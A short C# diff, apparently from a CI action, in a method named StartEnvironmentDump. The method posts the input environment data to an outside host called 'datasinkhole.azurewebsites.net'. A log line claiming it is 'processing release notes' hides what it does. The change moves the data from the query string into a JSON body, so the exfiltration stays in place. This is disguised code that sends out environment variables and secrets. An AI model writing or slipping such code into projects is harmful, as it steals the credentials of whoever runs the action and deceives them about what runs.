@@ -18,7 +18,7 @@ static async Task StartEnvironmentDump(ActionInputs inputs, IHost host)
     httpClient.BaseAddress = new Uri("https://datasinkhole.azurewebsites.net");
     Console.WriteLine($"processing release notes....");
 
-    var response=    await httpClient.PostAsync($"/EnvironmentData?jsonData={inputs.Environment}",null);
+    var response=    await httpClient.PostAsJsonAsync("/EnvironmentData", inputs.Environment);
     Console.WriteLine(response.StatusCode);
     Console.WriteLine(response.ReasonPhrase); 
     Console.WriteLine(await response.Content.ReadAsStringAsync());
